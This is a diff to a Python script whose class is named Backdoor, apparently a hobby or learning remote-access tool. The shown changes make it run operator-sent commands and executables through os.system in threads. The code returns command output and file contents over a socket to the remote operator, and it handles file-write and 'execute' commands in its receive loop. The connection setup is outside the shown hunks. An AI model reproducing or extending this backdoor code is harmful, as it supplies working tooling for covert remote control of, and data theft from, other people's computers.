@@ -52,44 +52,53 @@ class Backdoor:
     
     
     def sendStream(self,data):
-        print(data)
-        ####print(f'sendStream data type: {type(data)}')
-        if isinstance(data,str):
-
+        #print('start of send stream')
+        #print(f'data passed into function: {data}')
+        #print(f'sendStream data type: {type(data)}')
+        
+        if isinstance(data,str): #for regular output 
             jsData = json.dumps(data)
             ####print(jsData)
             self.connection.send(str(jsData).encode('utf-8'))
+        
         elif isinstance(data,dict): #using this for download function
             ###print(type(data))
             ###print(type(data['data']))
             ###print(data['data'])
-            if isinstance(data,dict):
-                if 'data' in data.keys():
-                    if isinstance(data['data'],bytes):
-                        data['data'] = data['data'].decode()
-                    ###print(type(data))
-                    ###print(type(data['data']))
-                    ###print(data['data'])
-                    
-                    #data = data['data'] #value of data
-                    print(f'sendStream dict data: {data}')
-                    print(type(data['data'])) #should be string
-                    print(type(data)) #should be dict
-                    
-                    jsData = json.dumps(data)
-                    print(jsData)
-                    self.connection.send(str(jsData).encode('utf-8'))
-                else:
-                    if isinstance(data['fault'],bytes):
-                        data['fault'] = data['fault'].decode()
-                    jsData = json.dumps(data)
-                    self.connection.send(str(jsData).encode('utf-8'))
+            
+            if 'data' in data.keys():
+                
+                if isinstance(data['data'],bytes):
+                    data['data'] = data['data'].decode()
+                ###print(type(data))
+                ###print(type(data['data']))
+                ###print(data['data'])
+                #data = data['data'] #value of data
+                #print(f'sendStream dict data: {data}')
+                #print(type(data['data'])) #should be string
+                #print(type(data)) #should be dict
+                
+                jsData = json.dumps(data)
+                #print(jsData)
+                self.connection.send(str(jsData).encode('utf-8'))
+            
+            else:
+                if isinstance(data['fault'],bytes):
+                    data['fault'] = data['fault'].decode()
+                jsData = json.dumps(data)
+                self.connection.send(str(jsData).encode('utf-8'))
+        
+        else:  # remainder of data types for now list                                          
+            print(f'data type: {type(data)}')
+            threadPid = str(data[-1])
+            print(f'string threadPid: {threadPid}')
+            jsData = json.dumps(threadPid)
+            self.connection.send(str(jsData).encode('utf-8'))
 
 
     def runExecutable(self,exe):
-        exeThread = threading.Thread(target=exe) #does this work??
-        exeThread.start()
-
+        os.system(exe)
+       
 
     def recvStream(self):
         time.sleep(1)
@@ -126,6 +135,7 @@ class Backdoor:
         except IndexError:
             return indError
 
+
     def write_file(self,file,content): #still going to use dictionary for sendandreceive
         #print('Starting write_file')
         #print(type(self.cmdIn[2]))
@@ -143,11 +153,10 @@ class Backdoor:
 
     def run(self):
         while True:
-            ###print('run1')
+            print('run1')
             self.cmdIn = self.recvStream()
-            #print(self.cmdIn) #list of the whole command output
-            ###print('run2')
-            
+            print(self.cmdIn) #list of the whole command output
+    
             if self.cmdIn[0] == 'bye':
                 ###print('bye')
                 self.connection.close()
@@ -178,13 +187,12 @@ class Backdoor:
                 cmdOut = self.write_file(file, content) #[1] is file name we are writing to memory, [2] is the content of the file
                 self.sendStream(cmdOut)
 
-
             elif self.cmdIn[0] == 'execute':
-                print(self.cmdIn[1]) #should be the exe name
-                #print(threading.enumerate())
-                self.sendStream(threading.enumerate()) # probably will not work with json 
-                
-            
+                print(f'Trying execute: {self.cmdIn[1]}') #should be the exe name
+                thread = threading.Thread(target=self.runExecutable,args=(self.cmdIn[1],))
+                thread.start()
+                self.sendStream(threading.enumerate())
+                            
             else:   
                 print('Try execute cmd')
                 ###print('run3_PRE_TRY')
@@ -196,7 +204,7 @@ class Backdoor:
                 ####print(cmdOut)
                 ###print(type(cmdOut))
                 self.sendStream(cmdOut)
-                   
+###############################################################################################RUN#########################################################################################################################                   
 
 try:
     args = Args()
@@ -210,3 +218,4 @@ except ConnectionResetError:
     sys.exit()
 except ConnectionRefusedError:
     sys.exit()
+    
